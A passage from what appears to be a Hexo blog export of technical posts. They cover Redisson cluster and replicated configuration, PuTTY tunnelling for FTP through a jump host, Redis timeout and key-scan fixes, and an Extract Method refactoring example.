<h3 id="Replicated-YAML-config-format"><a href="#Replicated-YAML-config-format" class="headerlink" title="Replicated YAML config format"></a>Replicated YAML config format</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Below is replicated configuration example <span class="keyword">in</span> YAML format. </span><br><span class="line">All property names matches with ReplicatedServersConfig and Config object property names.</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">replicatedServersConfig:</span><br><span class="line">  idleConnectionTimeout: 10000</span><br><span class="line">  connectTimeout: 10000</span><br><span class="line">  <span class="built_in">timeout</span>: 3000</span><br><span class="line">  retryAttempts: 3</span><br><span class="line">  retryInterval: 1500</span><br><span class="line">  failedSlaveReconnectionInterval: 3000</span><br><span class="line">  failedSlaveCheckInterval: 60000</span><br><span class="line">  password: null</span><br><span class="line">  subscriptionsPerConnection: 5</span><br><span class="line">  clientName: null</span><br><span class="line">  loadBalancer: !&lt;org.redisson.connection.balancer.RoundRobinLoadBalancer&gt; &#123;&#125;</span><br><span class="line">  subscriptionConnectionMinimumIdleSize: 1</span><br><span class="line">  subscriptionConnectionPoolSize: 50</span><br><span class="line">  slaveConnectionMinimumIdleSize: 24</span><br><span class="line">  slaveConnectionPoolSize: 64</span><br><span class="line">  masterConnectionMinimumIdleSize: 24</span><br><span class="line">  masterConnectionPoolSize: 64</span><br><span class="line">  readMode: <span class="string">&quot;SLAVE&quot;</span></span><br><span class="line">  subscriptionMode: <span class="string">&quot;SLAVE&quot;</span></span><br><span class="line">  nodeAddresses:</span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:2812&quot;</span></span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:2815&quot;</span></span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:2813&quot;</span></span><br><span class="line">  scanInterval: 1000</span><br><span class="line">threads: 16</span><br><span class="line">nettyThreads: 32</span><br><span class="line">codec: !&lt;org.redisson.codec.FstCodec&gt; &#123;&#125;</span><br><span class="line">transportMode: <span class="string">&quot;NIO&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>RedisReplication</tag>
      </tags>
  </entry>
  <entry>
    <title>RedissonCluster</title>
    <url>/posts/91228b2/</url>
    <content><![CDATA[<h3 id="RedissonCluster"><a href="#RedissonCluster" class="headerlink" title="RedissonCluster"></a>RedissonCluster</h3><span id="more"></span>
<p>Minimal cluster configuration requires to contain at least three master nodes. Cluster connection mode activated by follow line:<br>ClusterServersConfig clusterConfig &#x3D; config.useClusterServers();</p>
<p>ClusterServersConfig settings listed below:</p>
<h3 id="Cluster-settings"><a href="#Cluster-settings" class="headerlink" title="Cluster settings"></a>Cluster settings</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">checkSlotsCoverage</span><br><span class="line">Default value: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Enables cluster slots check during Redisson startup.</span><br><span class="line"></span><br><span class="line">nodeAddresses</span><br><span class="line">Add Redis cluster node address <span class="keyword">in</span> host:port format. Multiple nodes could be added at once. At least one node from Redis Cluster should be specified. </span><br><span class="line">Redisson discovers automatically cluster topology. Use rediss:// protocol <span class="keyword">for</span> SSL connection.</span><br><span class="line"></span><br><span class="line">scanInterval</span><br><span class="line">Default value: 1000</span><br><span class="line"></span><br><span class="line">Redis cluster scan interval <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">slots</span><br><span class="line">Default value: 231</span><br><span class="line"></span><br><span class="line">Partitions amount used <span class="keyword">for</span> data partitioning. Data partitioning supported by Set, Map, BitSet, Bloom filter, Spring Cache and Hibernate Cache structures.</span><br><span class="line"></span><br><span class="line">This setting is available only <span class="keyword">in</span> Redisson PRO edition.</span><br><span class="line"></span><br><span class="line">readMode</span><br><span class="line">Default value: SLAVE</span><br><span class="line"></span><br><span class="line">Set node <span class="built_in">type</span> used <span class="keyword">for</span> <span class="built_in">read</span> operation. Available values:</span><br><span class="line">SLAVE - Read from slave nodes, uses MASTER <span class="keyword">if</span> no SLAVES are available.</span><br><span class="line">MASTER - Read from master node,</span><br><span class="line">MASTER_SLAVE - Read from master and slave nodes</span><br><span class="line"></span><br><span class="line">subscriptionMode</span><br><span class="line">Default value: SLAVE</span><br><span class="line"></span><br><span class="line">Set node <span class="built_in">type</span> used <span class="keyword">for</span> subscription operation. Available values:</span><br><span class="line">SLAVE - Subscribe to slave nodes,</span><br><span class="line">MASTER - Subscribe to master node,</span><br><span class="line"></span><br><span class="line">loadBalancer</span><br><span class="line">Default value: org.redisson.connection.balancer.RoundRobinLoadBalancer</span><br><span class="line"></span><br><span class="line">Сonnection load balancer <span class="keyword">for</span> multiple Redis servers. Available implementations:</span><br><span class="line">org.redisson.connection.balancer.WeightedRoundRobinBalancer</span><br><span class="line">org.redisson.connection.balancer.RoundRobinLoadBalancer</span><br><span class="line">org.redisson.connection.balancer.RandomLoadBalancer</span><br><span class="line"></span><br><span class="line">subscriptionConnectionMinimumIdleSize</span><br><span class="line">Default value: 1</span><br><span class="line"></span><br><span class="line">Minimum idle connection pool size <span class="keyword">for</span> subscription (pub/sub) channels. Used by RTopic, RPatternTopic, RLock, RSemaphore, RCountDownLatch, RClusteredLocalCachedMap, </span><br><span class="line">RClusteredLocalCachedMapCache, RLocalCachedMap, RLocalCachedMapCache objects and Hibernate READ_WRITE cache strategy.</span><br><span class="line"></span><br><span class="line">subscriptionConnectionPoolSize</span><br><span class="line">Default value: 50</span><br><span class="line"></span><br><span class="line">Maximum connection pool size <span class="keyword">for</span> subscription (pub/sub) channels. Used by RTopic, RPatternTopic, RLock, RSemaphore, RCountDownLatch, RClusteredLocalCachedMap, </span><br><span class="line">RClusteredLocalCachedMapCache, RLocalCachedMap, RLocalCachedMapCache objects and Hibernate READ_WRITE cache strategy</span><br><span class="line"></span><br><span class="line">slaveConnectionMinimumIdleSize</span><br><span class="line">Default value: 24</span><br><span class="line"></span><br><span class="line">Redis <span class="string">&#x27;slave&#x27;</span> node minimum idle connection amount <span class="keyword">for</span> each slave node.</span><br><span class="line"></span><br><span class="line">slaveConnectionPoolSize</span><br><span class="line">Default value: 64</span><br><span class="line"></span><br><span class="line">Redis <span class="string">&#x27;slave&#x27;</span> node maximum connection pool size <span class="keyword">for</span> each slave node</span><br><span class="line"></span><br><span class="line">masterConnectionMinimumIdleSize</span><br><span class="line">Default value: 24</span><br><span class="line"></span><br><span class="line">Redis <span class="string">&#x27;master&#x27;</span> node minimum idle connection amount <span class="keyword">for</span> each slave node. Redisson idle connections are remain <span class="keyword">for</span> elected slave as master. </span><br><span class="line">Because this node remains <span class="keyword">in</span> slave connection pool but <span class="keyword">in</span> non-active state. </span><br><span class="line">These connections are preserved <span class="keyword">for</span> <span class="keyword">case</span> when your cluster lost all slaves. In this <span class="keyword">case</span> master used as slave and idle-connections become <span class="keyword">in</span> use.</span><br><span class="line"></span><br><span class="line">masterConnectionPoolSize</span><br><span class="line">Default value: 24</span><br><span class="line"></span><br><span class="line">Redis <span class="string">&#x27;master&#x27;</span> node maximum connection pool size</span><br><span class="line"></span><br><span class="line">idleConnectionTimeout</span><br><span class="line">Default value: 10000</span><br><span class="line"></span><br><span class="line">If pooled connection not used <span class="keyword">for</span> a <span class="built_in">timeout</span> time and current connections amount bigger than minimum idle connections pool size, <span class="keyword">then</span> it will closed and removed from pool. Value <span class="keyword">in</span> milliseconds.</span><br><span class="line"></span><br><span class="line">connectTimeout</span><br><span class="line">Default value: 10000</span><br><span class="line"></span><br><span class="line">Timeout <span class="keyword">in</span> milliseconds during connecting to any Redis server.</span><br><span class="line"></span><br><span class="line"><span class="built_in">timeout</span></span><br><span class="line">Default value: 3000</span><br><span class="line"></span><br><span class="line">Redis server response <span class="built_in">timeout</span> <span class="keyword">in</span> milliseconds. Starts to countdown when Redis <span class="built_in">command</span> was succesfully sent.</span><br><span class="line"></span><br><span class="line">retryAttempts</span><br><span class="line">Default value: 3</span><br><span class="line"></span><br><span class="line">Error will be thrown <span class="keyword">if</span> Redis <span class="built_in">command</span> can<span class="string">&#x27;t be sended to Redis server after retryAttempts. But if it sent succesfully then timeout will be started.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">retryInterval</span></span><br><span class="line"><span class="string">Default value: 1500</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Time interval in milliseconds after which another one attempt to send Redis command will be executed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password</span></span><br><span class="line"><span class="string">Default value: null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password for Redis server authentication.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username</span></span><br><span class="line"><span class="string">Default value: null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Username for Redis server authentication. Requires Redis 6.0+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">subscriptionsPerConnection</span></span><br><span class="line"><span class="string">Default value: 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Subscriptions per subscribe connection limit. Used by RTopic, RPatternTopic, RLock, RSemaphore, RCountDownLatch, RClusteredLocalCachedMap, </span></span><br><span class="line"><span class="string">RClusteredLocalCachedMapCache, RLocalCachedMap, RLocalCachedMapCache objects and Hibernate READ_WRITE cache strategy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">clientName</span></span><br><span class="line"><span class="string">Default value: null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Name of client connection.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sslEnableEndpointIdentification</span></span><br><span class="line"><span class="string">Default value: true</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enables SSL endpoint identification during handshaking, which prevents man-in-the-middle attacks.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sslProvider</span></span><br><span class="line"><span class="string">Default value: JDK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Defines SSL provider (JDK or OPENSSL) used to handle SSL connections. OPENSSL considered as faster implementation and requires netty-tcnative-boringssl-static to be added in classpath.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sslTruststore</span></span><br><span class="line"><span class="string">Default value: null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Defines path to SSL truststore. It&#x27;</span>s stores certificates <span class="built_in">which</span> is used to identify server side of SSL connection.</span><br><span class="line"></span><br><span class="line">sslTruststorePassword</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines password <span class="keyword">for</span> SSL truststore</span><br><span class="line"></span><br><span class="line">sslKeystore</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines path to SSL keystore. It<span class="string">&#x27;s stores private key and certificates corresponding to their public keys. Used if server side of SSL connection requires client authentication.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sslKeystorePassword</span></span><br><span class="line"><span class="string">Default value: null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Defines password for SSL keystore</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pingConnectionInterval</span></span><br><span class="line"><span class="string">Default value: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Defines PING command sending interval per connection to Redis. Set 0 to disable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">keepAlive</span></span><br><span class="line"><span class="string">Default value: false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enables TCP keepAlive for connection.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tcpNoDelay</span></span><br><span class="line"><span class="string">Default value: false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enables TCP noDelay for connection.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">natMapper</span></span><br><span class="line"><span class="string">Default value: no mapper</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Defines NAT mapper interface which maps Redis URI object. It&#x27;</span>s applied to all Redis connections. </span><br><span class="line">There are few implementations: org.redisson.api.HostPortNatMapper and org.redisson.api.HostNatMapper.</span><br></pre></td></tr></table></figure>

<h3 id="Cluster-YAML-config-format"><a href="#Cluster-YAML-config-format" class="headerlink" title="Cluster YAML config format"></a>Cluster YAML config format</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Below is cluster configuration example <span class="keyword">in</span> YAML format. All property names matches with ClusterServersConfig and Config object property names.</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">clusterServersConfig:</span><br><span class="line">  idleConnectionTimeout: 10000</span><br><span class="line">  connectTimeout: 10000</span><br><span class="line">  <span class="built_in">timeout</span>: 3000</span><br><span class="line">  retryAttempts: 3</span><br><span class="line">  retryInterval: 1500</span><br><span class="line">  failedSlaveReconnectionInterval: 3000</span><br><span class="line">  failedSlaveCheckInterval: 60000</span><br><span class="line">  password: null</span><br><span class="line">  subscriptionsPerConnection: 5</span><br><span class="line">  clientName: null</span><br><span class="line">  loadBalancer: !&lt;org.redisson.connection.balancer.RoundRobinLoadBalancer&gt; &#123;&#125;</span><br><span class="line">  subscriptionConnectionMinimumIdleSize: 1</span><br><span class="line">  subscriptionConnectionPoolSize: 50</span><br><span class="line">  slaveConnectionMinimumIdleSize: 24</span><br><span class="line">  slaveConnectionPoolSize: 64</span><br><span class="line">  masterConnectionMinimumIdleSize: 24</span><br><span class="line">  masterConnectionPoolSize: 64</span><br><span class="line">  readMode: <span class="string">&quot;SLAVE&quot;</span></span><br><span class="line">  subscriptionMode: <span class="string">&quot;SLAVE&quot;</span></span><br><span class="line">  nodeAddresses:</span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:7004&quot;</span></span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:7001&quot;</span></span><br><span class="line">  - <span class="string">&quot;redis://127.0.0.1:7000&quot;</span></span><br><span class="line">  scanInterval: 1000</span><br><span class="line">  pingConnectionInterval: 0</span><br><span class="line">  keepAlive: <span class="literal">false</span></span><br><span class="line">  tcpNoDelay: <span class="literal">false</span></span><br><span class="line">threads: 16</span><br><span class="line">nettyThreads: 32</span><br><span class="line">codec: !&lt;org.redisson.codec.FstCodec&gt; &#123;&#125;</span><br><span class="line">transportMode: <span class="string">&quot;NIO&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>PuTTY建立Tunnels使用FTP</title>
    <url>/posts/7c71ab/</url>
    <content><![CDATA[<h3 id="PuTTY建立Tunnels使用FTP"><a href="#PuTTY建立Tunnels使用FTP" class="headerlink" title="PuTTY建立Tunnels使用FTP"></a>PuTTY建立Tunnels使用FTP</h3><span id="more"></span>
<p>在正式環境的Server經常會有一台做Google Authenticator的跳板機。<br>通過跳板機的認證後才能連到後面的Web Server。這篇介紹如何建立<br>Tunnels來將上版程式丟到Server上。</p>
<h3 id="建立PuTTY的Tunnels"><a href="#建立PuTTY的Tunnels" class="headerlink" title="建立PuTTY的Tunnels"></a>建立PuTTY的Tunnels</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/PuTTY_Tunnels.PNG" width="50%" />
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">圖片代表localhost Port:10001</span><br><span class="line">若通過跳板機認證，會有Tunnels連至IP:10.10.100.1，Port:12345</span><br></pre></td></tr></table></figure>

<h3 id="建立FTP"><a href="#建立FTP" class="headerlink" title="建立FTP"></a>建立FTP</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/FTP_Setting.PNG" width="50%" />
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">圖片代表建立127.0.0.1 Port:10001</span><br><span class="line">若通過跳板機認證，即可連至IP:10.10.100.1，Port:12345 上傳檔案</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PuTTY</category>
      </categories>
      <tags>
        <tag>Tunnels</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis Timeout Exception</title>
    <url>/posts/56f68d3b/</url>
    <content><![CDATA[<h3 id="3003-Subscribe-timeout-7500ms-Increase-‘subscriptionsPerConnection’-and-x2F-or-‘subscriptionConnectionPoolSize’-parameters"><a href="#3003-Subscribe-timeout-7500ms-Increase-‘subscriptionsPerConnection’-and-x2F-or-‘subscriptionConnectionPoolSize’-parameters" class="headerlink" title="3003 - Subscribe timeout: (7500ms). Increase ‘subscriptionsPerConnection’ and&#x2F;or ‘subscriptionConnectionPoolSize’ parameters."></a>3003 - Subscribe timeout: (7500ms). Increase ‘subscriptionsPerConnection’ and&#x2F;or ‘subscriptionConnectionPoolSize’ parameters.</h3><span id="more"></span>
<p>這篇介紹3003 - Subscribe timeout: (7500ms). Increase ‘subscriptionsPerConnection’ and&#x2F;or ‘subscriptionConnectionPoolSize’ parameters.。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Redisson取得RLock時，throw org.redisson.client.RedisTimeoutException。</span><br><span class="line">詳細Error Message為</span><br><span class="line">3003 - Subscribe <span class="built_in">timeout</span>: (7500ms). Increase <span class="string">&#x27;subscriptionsPerConnection&#x27;</span> </span><br><span class="line">and/or <span class="string">&#x27;subscriptionConnectionPoolSize&#x27;</span> parameters.</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Redisson在參數初始化時，ClusterServersConfig有兩個初始參數欄位</span><br><span class="line">subscriptionsPerConnection</span><br><span class="line">subscriptionConnectionPoolSize</span><br><span class="line">調大即可解決</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisson getKeys getKeysByPatterns Problem</title>
    <url>/posts/f078d596/</url>
    <content><![CDATA[<h3 id="Redisson-getKeys-getKeysByPatterns-Problem"><a href="#Redisson-getKeys-getKeysByPatterns-Problem" class="headerlink" title="Redisson getKeys getKeysByPatterns Problem"></a>Redisson getKeys getKeysByPatterns Problem</h3><span id="more"></span>
<p>這篇介紹Redisson getKeys getKeysByPatterns 所碰到的Problem。</p>
<h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用redissonClient.getKeys().getKeysByPatterns(key);</span><br><span class="line">發現查詢過慢 -&gt; 1 second --&gt; 4~5分鐘</span><br><span class="line">原因:因key突然變多有幾十萬個key，在撈的時候必須要從幾十萬筆Full Scan。</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">新增一個RSet&lt;String&gt;來記錄key</span><br><span class="line">使用redissonClient.getSet來取得key</span><br><span class="line">取代redissonClient.getKeys().getKeysByPatterns(key);方法避免Full Scan。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisson概述</title>
    <url>/posts/753ac8ae/</url>
    <content><![CDATA[<h3 id="Redisson概述"><a href="#Redisson概述" class="headerlink" title="Redisson概述"></a>Redisson概述</h3><span id="more"></span>
<p>Redisson is a Redis Java client with features of In-Memory Data Grid.<br>Redisson objects provides a separation of concern, which allows you to keep focus on the data modeling and application logic.</p>
<h3 id="Programmatic-configuration"><a href="#Programmatic-configuration" class="headerlink" title="Programmatic configuration"></a>Programmatic configuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Config config = new Config();</span><br><span class="line">config.setTransportMode(TransportMode.EPOLL);</span><br><span class="line">config.useClusterServers()</span><br><span class="line">       // use <span class="string">&quot;rediss://&quot;</span> <span class="keyword">for</span> SSL connection</span><br><span class="line">      .addNodeAddress(<span class="string">&quot;perredis://127.0.0.1:7181&quot;</span>);</span><br><span class="line"></span><br><span class="line">RedissonClient redisson = Redisson.create(config);</span><br></pre></td></tr></table></figure>

<h3 id="Declarative-configuration"><a href="#Declarative-configuration" class="headerlink" title="Declarative configuration"></a>Declarative configuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">YAML file based configuration</span><br><span class="line">Redisson configuration could be stored <span class="keyword">in</span> YAML format.</span><br><span class="line">Use config.fromYAML method to <span class="built_in">read</span> configuration stored <span class="keyword">in</span> YAML format:</span><br><span class="line"></span><br><span class="line">Config config = Config.fromYAML(new File(<span class="string">&quot;config-file.yaml&quot;</span>));  </span><br><span class="line">RedissonClient redisson = Redisson.create(config);</span><br></pre></td></tr></table></figure>

<h3 id="Common-settings"><a href="#Common-settings" class="headerlink" title="Common settings"></a>Common settings</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Follow settings belong to org.redisson.Config object and common <span class="keyword">for</span> all modes:</span><br><span class="line"></span><br><span class="line">codec</span><br><span class="line">Default value: org.redisson.codec.FstCodec</span><br><span class="line"></span><br><span class="line">Redis data codec. Used during <span class="built_in">read</span> and write Redis data. Several implementations are available.</span><br><span class="line"></span><br><span class="line">nettyThreads</span><br><span class="line">Default value: 32</span><br><span class="line"></span><br><span class="line">Threads amount shared between all redis clients used by Redisson. Netty threads used <span class="keyword">in</span> Redis response decoding and <span class="built_in">command</span> sending. 0 = cores_amount * 2</span><br><span class="line"></span><br><span class="line">nettyHook</span><br><span class="line">Default value: empty object</span><br><span class="line"></span><br><span class="line">Netty hook applied to Netty Bootstrap and Channel objects.</span><br><span class="line"></span><br><span class="line">executor</span><br><span class="line">Use external ExecutorService <span class="built_in">which</span> process all listeners of RTopic, RRemoteService invocation handlers and RExecutorService tasks.</span><br><span class="line"></span><br><span class="line">eventLoopGroup</span><br><span class="line">Use external EventLoopGroup. EventLoopGroup processes all Netty connection tied with Redis servers by own threads. </span><br><span class="line">Each Redisson client creates own EventLoopGroup by default. So <span class="keyword">if</span> there are multiple Redisson instances <span class="keyword">in</span> same JVM it would be useful to share one EventLoopGroup among them.</span><br><span class="line"></span><br><span class="line">Only io.netty.channel.epoll.EpollEventLoopGroup, io.netty.channel.kqueue.KQueueEventLoopGroup and io.netty.channel.nio.NioEventLoopGroup are allowed <span class="keyword">for</span> usage.</span><br><span class="line"></span><br><span class="line">transportMode</span><br><span class="line">Default value: TransportMode.NIO</span><br><span class="line"></span><br><span class="line">Available values:</span><br><span class="line">TransportMode.NIO,</span><br><span class="line">TransportMode.EPOLL - requires netty-transport-native-epoll lib <span class="keyword">in</span> classpath</span><br><span class="line">TransportMode.KQUEUE - requires netty-transport-native-kqueue lib <span class="keyword">in</span> classpath</span><br><span class="line"></span><br><span class="line">threads</span><br><span class="line">Default value: 16</span><br><span class="line"></span><br><span class="line">Threads amount shared across all listeners of RTopic object, invocation handlers of RRemoteService, RTopic object and RExecutorService tasks.</span><br><span class="line"></span><br><span class="line">lockWatchdogTimeout</span><br><span class="line">Default value: 30000</span><br><span class="line"></span><br><span class="line">Lock watchdog <span class="built_in">timeout</span> <span class="keyword">in</span> milliseconds. This parameter is only used <span class="keyword">if</span> lock has been acquired without leaseTimeout parameter definition. </span><br><span class="line">Lock will be expired after lockWatchdogTimeout <span class="keyword">if</span> watchdog didn<span class="string">&#x27;t extend it to the next lockWatchdogTimeout time interval. </span></span><br><span class="line"><span class="string">This prevents against infinity locked locks due to Redisson client crush or any other reason when lock can&#x27;</span>t be released <span class="keyword">in</span> proper way.</span><br><span class="line"></span><br><span class="line">addressResolverGroupFactory</span><br><span class="line">Default value: org.redisson.connection.DnsAddressResolverGroupFactory</span><br><span class="line"></span><br><span class="line">Allows to specify customized implementation of DnsAddressResolverGroup.</span><br><span class="line"></span><br><span class="line">Available implementations:</span><br><span class="line"></span><br><span class="line">org.redisson.connection.DnsAddressResolverGroupFactory - uses default DNS servers list provided by OS.</span><br><span class="line">org.redisson.connection.RoundRobinDnsAddressResolverGroupFactory - uses default DNS servers list provided by OS <span class="keyword">in</span> round robin mode.</span><br><span class="line">useScriptCache</span><br><span class="line">Default value: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Defines whether to use Lua-script cache on Redis side. Most Redisson methods are Lua-script based and this setting turned on could increase speed of such methods execution and save network traffic.</span><br><span class="line"></span><br><span class="line">NOTE: readMode option is not taken into account <span class="keyword">for</span> such calls as Redis slave redirects execution of cached Lua-script on Redis master node.</span><br><span class="line"></span><br><span class="line">keepPubSubOrder</span><br><span class="line">Default value: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Defines whether keep PubSub messages handling <span class="keyword">in</span> arrival order or handle messages concurrently. This setting applied only <span class="keyword">for</span> PubSub messages per channel.</span><br><span class="line"></span><br><span class="line">minCleanUpDelay</span><br><span class="line">Default value: 5</span><br><span class="line"></span><br><span class="line">Defines minimum delay <span class="keyword">in</span> seconds <span class="keyword">for</span> clean up process of expired entries. Applied to JCache, RSetCache, RMapCache, RListMultimapCache, RSetMultimapCache objects.</span><br><span class="line"></span><br><span class="line">maxCleanUpDelay</span><br><span class="line">Default value: 1800</span><br><span class="line"></span><br><span class="line">Defines maximum delay <span class="keyword">in</span> seconds <span class="keyword">for</span> clean up process of expired entries. Applied to JCache, RSetCache, RMapCache, RListMultimapCache, RSetMultimapCache objects.</span><br><span class="line"></span><br><span class="line">cleanUpKeysAmount</span><br><span class="line">Default value: 100</span><br><span class="line"></span><br><span class="line">Defines expired keys amount deleted per single operation during clean up process of expired entries. Applied to JCache, RSetCache, RMapCache, RListMultimapCache, RSetMultimapCache objects.</span><br><span class="line"></span><br><span class="line">meterMode</span><br><span class="line">Default value: MeterMode.ALL</span><br><span class="line"></span><br><span class="line">Defines Micrometer statistics collection mode.</span><br><span class="line"></span><br><span class="line">This setting is available only <span class="keyword">in</span> Redisson PRO edition.</span><br><span class="line"></span><br><span class="line">Available values:</span><br><span class="line"></span><br><span class="line">MeterMode.ALL - collect both Redis and Redisson objects statistics</span><br><span class="line">MeterMode.REDIS - collect only Redis statistics</span><br><span class="line">MeterMode.OBJECTS - collect only Redisson objects statistics</span><br><span class="line">meterRegistryProvider</span><br><span class="line">Default value: null</span><br><span class="line"></span><br><span class="line">Defines Micrometer registry provider used to collect various statistics <span class="keyword">for</span> Redisson objects. Please refer to statistics monitoring sections <span class="keyword">for</span> list of all available providers.</span><br><span class="line"></span><br><span class="line">This setting is available only <span class="keyword">in</span> Redisson PRO edition.</span><br><span class="line"></span><br><span class="line">useThreadClassLoader</span><br><span class="line">Default value: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Defines whether to supply Thread ContextClassLoader to Codec. Usage of Thread.getContextClassLoader() may resolve ClassNotFoundException error arise during Redis response decoding.</span><br><span class="line">This error might arise <span class="keyword">if</span> Redisson is used <span class="keyword">in</span> both Tomcat and deployed application.</span><br><span class="line"></span><br><span class="line">performanceMode</span><br><span class="line">Default value: LOWER_LATENCY_MODE_2</span><br><span class="line"></span><br><span class="line">Defines <span class="built_in">command</span> processing engine performance mode. Since all values are application specific (except NORMAL value) it<span class="string">&#x27;s recommended to try all of them.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This setting is available only in Redisson PRO edition.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available values:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">HIGHER_THROUGHPUT - switches command processor engine to higher throughput mode</span></span><br><span class="line"><span class="string">LOWER_LATENCY_AUTO - switches command processor engine to lower latency mode and detect optimal settings automatically</span></span><br><span class="line"><span class="string">LOWER_LATENCY_MODE_2 - switches command processor engine to lower latency mode with predefined settings set #2</span></span><br><span class="line"><span class="string">LOWER_LATENCY_MODE_1 - switches command processor engine to lower latency mode with predefined settings set #1</span></span><br><span class="line"><span class="string">NORMAL - switches command processor engine to normal mode</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>Refactor ComposingMethods ExtractMethod</title>
    <url>/posts/3409d77a/</url>
    <content><![CDATA[<h2 id="Refactor-ComposingMethods-ExtractMethod"><a href="#Refactor-ComposingMethods-ExtractMethod" class="headerlink" title="Refactor-ComposingMethods:ExtractMethod"></a>Refactor-ComposingMethods:ExtractMethod</h2><span id="more"></span>
<p>在重構的Composing methods中，第一個最基本的方法就是<br>Extract Method。這篇將介紹Extract Method的使用方法。</p>
<h2 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution:"></a>Problem &amp; Solution:</h2><p>Problem:You have a code fragment that can be grouped together.<br>Solution:Move this code to a separate new method (or function) and replace the old code with a call to the method.</p>
<h2 id="Example-by-Java-before-Rafactor"><a href="#Example-by-Java-before-Rafactor" class="headerlink" title="Example by Java before Rafactor:"></a>Example by Java before Rafactor:</h2><p>void printOwing() {<br>  printBanner();</p>
<p>  &#x2F;&#x2F; Print details.<br>  System.out.println(“name: “ + name);<br>  System.out.println(“amount: “ + getOutstanding());<br>}</p>
<h2 id="Example-by-Java-after-Rafactor"><a href="#Example-by-Java-after-Rafactor" class="headerlink" title="Example by Java after Rafactor:"></a>Example by Java after Rafactor:</h2><p>void printOwing() {<br>  printBanner();<br>  printDetails(getOutstanding());<br>}</p>
